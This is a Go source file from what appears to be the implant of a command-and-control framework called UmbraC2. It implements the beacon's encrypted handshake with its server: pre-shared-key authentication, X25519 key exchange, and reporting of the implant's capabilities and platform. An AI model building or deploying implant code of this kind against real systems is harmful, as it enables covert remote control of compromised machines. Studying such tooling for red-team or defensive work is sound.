package beacon

import (
	"errors"
	"fmt"
	"io"
	"time"

	"github.com/thesyntax1/UmbraC2/implant/go/internal/crypt"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/session"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/upk"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/wire"
)

// Hello is what the implant tells the server about itself.
type Hello struct {
	// Version is the handshake version.  Version 2 adds the capability
	// list, the implant version, the ABI version and the platform.
	Version byte
	// Capabilities is the list of the task kinds this implant can run.
	// The server refuses to queue work that is not on this list, so it
	// must be exactly what the task table below can do.
	Capabilities []any
	// ImplantVersion is the version of the implant itself.
	ImplantVersion string
	// ABI is the version of the task ABI.
	ABI byte
	// Platform describes the host the implant runs on.
	Platform map[string]any
}

// Handshake is what a finished handshake leaves behind.
type Handshake struct {
	// Session is the encrypted link.
	Session *session.Session
	// SessionID is the identifier the server gave to this link.
	SessionID []byte
	// Ack is the body of the HELLO_ACK.
	Ack map[string]any
}

// ClientHandshake runs the client half of the UmbraC2 handshake over rw.
//
// The pre-shared key is used directly in this one moment; everything
// after it is protected by the keys that both sides derive from the
// X25519 exchange, so a stolen pre-shared key alone does not decrypt a
// recorded session.
func ClientHandshake(rw io.ReadWriter, psk []byte, ident string, suite byte, meta map[string]any, hello Hello) (*Handshake, error) {
	if len(psk) == 0 {
		return nil, errors.New("the handshake needs a pre-shared key")
	}
	if !crypt.SuiteSupported(suite) {
		return nil, fmt.Errorf("the suite %d is not one this implant speaks", suite)
	}
	keypair, err := crypt.NewX25519Keypair()
	if err != nil {
		return nil, fmt.Errorf("x25519 keypair: %w", err)
	}
	cn, err := crypt.RandomBytes(16)
	if err != nil {
		return nil, fmt.Errorf("client nonce: %w", err)
	}
	ts := uint64(time.Now().Unix())
	auth, err := crypt.HelloAuth(psk, crypt.RoleAgent, []byte(ident), keypair.Pub, cn, ts, suite)
	if err != nil {
		return nil, fmt.Errorf("hello auth: %w", err)
	}

	body := map[string]any{
		"v":     uint64(hello.Version),
		"role":  uint64(crypt.RoleAgent),
		"id":    ident,
		"pub":   keypair.Pub,
		"cn":    cn,
		"ts":    ts,
		"suite": uint64(suite),
		"auth":  auth,
		"meta":  meta,
	}
	if hello.Version >= 2 {
		// The capability list is a field of its own now: the server
		// reads it before it looks at the metadata, and it refuses
		// work the beacon cannot do.
		body["caps"] = hello.Capabilities
		body["iver"] = hello.ImplantVersion
		body["abi"] = uint64(hello.ABI)
		body["plat"] = hello.Platform
	}
	encoded, err := upk.Encode(body)
	if err != nil {
		return nil, fmt.Errorf("encode hello: %w", err)
	}
	payload := append([]byte{wire.MarkerHello}, encoded...)

	boot, err := session.NewBootstrap(psk, suite, false)
	if err != nil {
		return nil, fmt.Errorf("bootstrap session: %w", err)
	}
	frame, err := boot.SealFrame(wire.MsgHello, payload)
	if err != nil {
		return nil, fmt.Errorf("seal hello: %w", err)
	}
	if _, err := rw.Write(frame); err != nil {
		return nil, fmt.Errorf("write hello: %w", err)
	}

	resp, err := wire.ReadFrame(rw)
	if err != nil {
		return nil, fmt.Errorf("read hello ack: %w", err)
	}
	msgType, plain, err := boot.OpenFrame(resp)
	if err != nil {
		return nil, fmt.Errorf("open hello ack: %w", err)
	}
	if msgType != wire.MsgHelloAck {
		return nil, fmt.Errorf("expected HELLO_ACK, got %s", wire.TypeName(msgType))
	}
	if len(plain) == 0 || plain[0] != wire.MarkerHelloAck {
		return nil, errors.New("bad HELLO_ACK marker")
	}
	decoded, err := upk.DecodeExact(plain[1:])
	if err != nil {
		return nil, fmt.Errorf("decode hello ack: %w", err)
	}
	ack, ok := decoded.(map[string]any)
	if !ok {
		return nil, errors.New("the hello ack is not a map")
	}

	serverPub := binField(ack, "pub")
	sn := binField(ack, "sn")
	sid := binField(ack, "sid")
	if len(serverPub) != 32 || len(sn) != 16 || len(sid) != 16 {
		return nil, errors.New("malformed HELLO_ACK fields")
	}
	negotiated := uint8(u64Or(ack, "suite", uint64(suite)))
	if negotiated != suite {
		return nil, errors.New("the server changed the AEAD suite without negotiation")
	}
	want, err := crypt.AckAuth(psk, []byte(ident), keypair.Pub, serverPub, cn, sn, sid, negotiated)
	if err != nil {
		return nil, fmt.Errorf("ack auth: %w", err)
	}
	if !crypt.ConstantTimeEq(want, binField(ack, "auth")) {
		return nil, errors.New("server authentication failed (wrong PSK?)")
	}
	shared, err := keypair.Shared(serverPub)
	if err != nil {
		return nil, fmt.Errorf("x25519: %w", err)
	}
	prk, km, err := crypt.DeriveSession(shared, cn, sn)
	if err != nil {
		return nil, fmt.Errorf("derive session: %w", err)
	}
	sess, err := session.New(negotiated, km, false, false, prk)
	if err != nil {
		return nil, fmt.Errorf("session: %w", err)
	}
	return &Handshake{Session: sess, SessionID: sid, Ack: ack}, nil
}
